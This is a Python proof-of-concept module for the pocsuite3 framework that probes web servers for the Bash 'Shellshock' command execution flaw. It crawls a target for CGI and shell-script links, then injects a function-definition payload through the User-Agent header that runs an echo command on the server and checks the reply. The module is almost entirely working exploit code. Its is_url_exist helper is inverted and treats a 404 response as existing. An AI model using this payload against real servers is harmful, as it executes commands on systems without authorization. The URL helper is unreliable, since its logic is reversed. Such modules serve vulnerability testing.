"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
import random
import re
import string
from os.path import normpath
from urllib.parse import urljoin, urlparse, urlunparse

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout


class DemoPOC(POCBase):
    vulID = '1521'  # ssvid
    version = '1'
    author = ['chenghs@knownsec.com']
    vulDate = '2014-09-24'
    createDate = '2014-09-25'
    updateDate = '2014-09-25'
    references = ['https://www.invisiblethreat.ca/2014/09/cve-2014-6271/']
    name = 'Bash 4.3 远程命令执行漏洞 POC'
    appPowerLink = 'http://www.gnu.org/software/bash/'
    appName = 'Bash'
    appVersion = '3.0-4.3#'
    vulType = 'Command Execution'
    desc = '''
            Bash 在解析环境变量时，会解析函数，同时可以运行函数后的语句，造成命令执行。
            '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}

        try:
            vul_url = get_url_need(self.url)
            if not vul_url.endswith('.cgi') and not vul_url.endswith('.sh'):
                pass
            else:
                random_str = ''.join(random.sample(string.ascii_letters + string.digits, 50))
                headers_fake = {}
                headers_fake['User-Agent'] = '() { :; }; echo; echo X-Bash-Test: %s' % random_str

                response = requests.get(vul_url, headers=headers_fake)
                response = response.text

                if 'X-Bash-Test: %s' % random_str == response.split('\n')[0]:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = vul_url
        except Exception as e:
            logger.exception(e)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()

    def _shell(self):
        pass


def get_url(url):
    try:
        return requests.get(url).url
    except:
        return url


def fix_url(url):
    if not url.startswith('http'):
        url = 'http://%s' % url
    return url


def get_url_need(url):
    url_need = None

    url = fix_url(url)

    if url.endswith('.cgi') or url.endswith('.sh'):
        url_need = url
        return url_need

    url = get_url(url)
    url_need = get_link(url)

    if not url_need:
        # print '[*] get url need error'
        url_need = url

    info = url_need
    # print info
    return info


def get_link(url):
    rnt = ''
    try:
        page_content = requests.get(url).text
        match = re.findall(r'''(?:href|action|src)\s*?=\s*?(?:"|')\s*?([^'"]*?\.(?:cgi|sh|pl))''', page_content)
        for item_url in match:
            if not item_url.startswith('http'):
                item_url = getAbsoluteURL(url, item_url)
            if not is_url_exist(item_url):
                continue
            if isSameDomain(item_url, url):
                rnt = item_url
                break
        return rnt
    except:
        # raise e
        return rnt


def getAbsoluteURL(base, url):
    url1 = urljoin(base, url)
    arr = urlparse(url1)
    path = normpath(arr[2])
    return urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))


def is_url_exist(url):
    try:
        resp = requests.get(url)
        if resp.status_code == 404:
            return True
    except Exception as e:
        pass
    return False


def isSameDomain(url1, url2):
    try:
        if urlparse(url1).netloc.split(':')[0] == urlparse(url2).netloc.split(':')[0]:
            return True
        else:
            return False
    except:
        return False


register_poc(DemoPOC)